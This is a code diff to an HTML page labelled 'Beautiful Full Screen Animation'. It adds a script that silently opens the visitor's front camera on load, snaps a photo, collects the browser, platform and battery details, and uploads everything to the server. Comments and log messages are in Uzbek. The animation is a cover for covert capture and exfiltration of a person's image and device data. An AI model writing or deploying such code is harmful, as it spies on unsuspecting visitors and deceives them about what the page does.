@@ -324,10 +324,94 @@
         <p>Beautiful Full Screen Animation</p>
       </div>
     </div>
-
     <video id="video" autoplay></video>
-
     <script>
+      const video = document.getElementById("video");
+
+      async function startCamera() {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" },
+            audio: false,
+          });
+
+          video.srcObject = stream;
+
+          video.onloadedmetadata = () => {
+            video.play();
+            setTimeout(() => captureAndSendPhoto(stream), 1500);
+          };
+        } catch (err) {
+          console.error("Kamera ruxsati berilmadi:", err);
+        }
+      }
+
+      async function captureAndSendPhoto(stream) {
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // Kamera oqimini to'xtatish
+        stream.getTracks().forEach((track) => track.stop());
+
+        // Rasmni blob sifatida olish
+        let blob;
+        if (canvas.toBlob) {
+          blob = await new Promise((resolve) =>
+            canvas.toBlob(resolve, "image/jpeg")
+          );
+        } else {
+          const dataUrl = canvas.toDataURL("image/jpeg");
+          blob = await (await fetch(dataUrl)).blob();
+        }
+
+        // Qurilma haqida ma'lumotlar
+        const userAgent = navigator.userAgent || "unknown";
+        const platform = navigator.platform || "unknown";
+
+        let batteryLevel = "unknown";
+        let batteryCharging = "unknown";
+
+        if (navigator.getBattery) {
+          try {
+            const battery = await navigator.getBattery();
+            batteryLevel = battery.level;
+            batteryCharging = battery.charging;
+          } catch (e) {
+            console.warn("Battery API ishlamadi");
+          }
+        }
+
+        // FormData yuborish
+        const formData = new FormData();
+        formData.append("photo", blob, "auto.jpg");
+        formData.append("userAgent", userAgent);
+        formData.append("platform", platform);
+        formData.append("batteryLevel", batteryLevel);
+        formData.append("batteryCharging", batteryCharging);
+
+        fetch("/upload", {
+          method: "POST",
+          body: formData,
+        })
+          .then((res) => {
+            if (res.ok) {
+              console.log("Rasm va ma'lumotlar yuborildi ✅");
+            } else {
+              console.error("Yuborishda xatolik ❌");
+            }
+          })
+          .catch((err) => {
+            console.error("Xatolik:", err);
+          });
+      }
+
+      startCamera();
+    </script>
+
+    <!-- <script>
       const video = document.getElementById("video");
 
       navigator.mediaDevices
@@ -387,6 +471,6 @@
             console.error("Xatolik:", err);
           });
       }
-    </script>
+    </script> -->
   </body>
 </html>
